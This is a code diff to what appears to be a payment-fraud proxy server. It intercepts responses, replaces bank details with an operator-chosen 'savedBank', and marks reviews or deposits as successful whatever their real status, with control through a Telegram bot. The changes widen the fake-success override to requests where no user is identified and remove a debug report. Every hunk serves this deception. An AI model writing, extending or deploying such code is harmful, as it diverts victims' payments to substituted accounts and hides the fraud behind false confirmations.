@@ -337,8 +337,17 @@ function getEffectiveSettings(data, userId) {
     depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
     depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
     bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null,
-    forceReviewSuccess: uo && uo.forceReviewSuccess === true
+    forceReviewSuccess: uo && uo.forceReviewSuccess === true,
+    _userId: userId
   };
+}
+
+function isAnyForceReviewSuccess(data) {
+  if (!data.userOverrides) return false;
+  for (const uid of Object.keys(data.userOverrides)) {
+    if (data.userOverrides[uid].forceReviewSuccess === true) return true;
+  }
+  return false;
 }
 
 function getActiveBank(data, userId) {
@@ -1316,20 +1325,8 @@ async function proxyAndReplaceBankDetails(req, res, label) {
           deepReplace(respData, savedBank, {}, 0);
         }
       }
-      if (eff.forceReviewSuccess) {
-        if (data.adminChatId && bot) {
-          const statusDebug = {};
-          const src = Array.isArray(respData) ? respData[0] : respData;
-          if (src && typeof src === 'object') {
-            for (const k of Object.keys(src)) {
-              const kl = k.toLowerCase();
-              if (kl.includes('status') || kl.includes('state') || kl.includes('pay')) {
-                statusDebug[k] = src[k];
-              }
-            }
-          }
-          bot.sendMessage(data.adminChatId, `🔍 Status fields BEFORE fix:\n${JSON.stringify(statusDebug, null, 2)}`).catch(()=>{});
-        }
+      const shouldForceSuccess = eff.forceReviewSuccess || (!detectedUserId && isAnyForceReviewSuccess(data));
+      if (shouldForceSuccess) {
         if (Array.isArray(respData)) {
           respData.forEach(item => markReviewAsSuccess(item));
         } else {
@@ -1529,6 +1526,7 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
         }
       }
       const eff2 = getEffectiveSettings(data, detectedUserId);
+      const shouldForceSuccess = eff2.forceReviewSuccess || (!detectedUserId && isAnyForceReviewSuccess(data));
       for (const item of items) {
         const ids = getItemIds(item);
         const primaryId = ids[0] || '';
@@ -1536,7 +1534,7 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
         if (savedBank) {
           deepReplace(item, savedBank, {}, 0);
         }
-        if (eff2.forceReviewSuccess) {
+        if (shouldForceSuccess) {
           markReviewAsSuccess(item);
         }
       }
